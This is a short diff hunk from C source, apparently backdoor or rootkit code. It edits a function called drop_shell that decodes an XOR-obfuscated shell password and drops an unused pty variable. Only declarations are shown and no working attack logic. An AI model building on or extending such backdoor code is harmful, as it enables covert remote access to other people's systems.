@@ -8,7 +8,7 @@ int drop_shell(int sock, struct sockaddr *addr)
 
 	char buf[512]; 
 	char *shellpw = strdup(SHELLPW); xor(shellpw); 
-	int pid, pty; 
+	int pid; 
 	ssize_t (*s_write()); 
 	init(); 
 	memset(buf, 0x00, sizeof(buf)); 
